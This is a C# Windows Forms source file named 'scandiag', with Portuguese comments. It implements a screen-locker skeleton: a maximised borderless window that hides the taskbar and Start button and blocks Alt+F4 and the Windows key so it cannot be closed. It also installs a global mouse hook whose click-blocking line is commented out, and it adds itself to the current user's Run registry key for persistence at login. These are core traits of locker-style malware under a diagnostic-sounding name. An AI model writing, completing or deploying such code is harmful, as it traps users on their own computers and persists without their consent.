using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;

namespace scandiag
{
    public partial class Form1 : Form
    {
        private const int WH_MOUSE_LL = 14;
        private const int WM_LBUTTONDOWN = 0x0201;
        private const int WM_RBUTTONDOWN = 0x0204;

        private delegate IntPtr LowLevelMouseProc(int nCode, IntPtr wParam, IntPtr lParam);
        private static LowLevelMouseProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelMouseProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern IntPtr FindWindowEx(IntPtr hwndParent, IntPtr hwndChildAfter, string lpszClass, string lpszWindow);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        public Form1()
        {
            InitializeComponent();
            this.FormBorderStyle = FormBorderStyle.None;
            this.WindowState = FormWindowState.Maximized;
        }

        protected override void OnLoad(EventArgs e)
        {
            base.OnLoad(e);
            HideTaskbar();
            _hookID = SetHook(_proc);
        }

        protected override void OnFormClosed(FormClosedEventArgs e)
        {
            base.OnFormClosed(e);
            UnhookWindowsHookEx(_hookID);
            ShowTaskbar();
        }

        private static void HideTaskbar()
        {
            var taskbarHandle = FindWindow("Shell_TrayWnd", null);
            var startButtonHandle = FindWindowEx(taskbarHandle, IntPtr.Zero, "Button", null);
            ShowWindow(taskbarHandle, 0);
            ShowWindow(startButtonHandle, 0);
        }

        private static void ShowTaskbar()
        {
            var taskbarHandle = FindWindow("Shell_TrayWnd", null);
            var startButtonHandle = FindWindowEx(taskbarHandle, IntPtr.Zero, "Button", null);
            ShowWindow(taskbarHandle, 1);
            ShowWindow(startButtonHandle, 1);
        }

        private static IntPtr SetHook(LowLevelMouseProc proc)
        {
            using (var curProcess = System.Diagnostics.Process.GetCurrentProcess())
            using (var curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_MOUSE_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && (wParam == (IntPtr)WM_LBUTTONDOWN || wParam == (IntPtr)WM_RBUTTONDOWN))
            {
                Console.WriteLine("Bloqueando Mouse");
                // Bloquear os cliques do mouse
                //return (IntPtr)1;
            }

            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            rk.SetValue("scandiag", Application.ExecutablePath);
        }

        protected override bool ProcessCmdKey(ref Message msg, Keys keyData)
        {
            Console.WriteLine(keyData);
            Console.WriteLine(msg.Msg.ToString());
            const int WM_SYSKEYDOWN = 0x0104; 

            if ((msg.Msg == WM_SYSKEYDOWN) && (keyData == (Keys.Alt | Keys.F4)))
            {
                return true; // Impede o fechamento do aplicativo
            }
            if (keyData == (Keys.LWin)) // Verificar se a tecla Windows foi pressionada
            {
                // Ignorar a tecla Windows
                return true;
            }

            return base.ProcessCmdKey(ref msg, keyData);
        }
    }
}
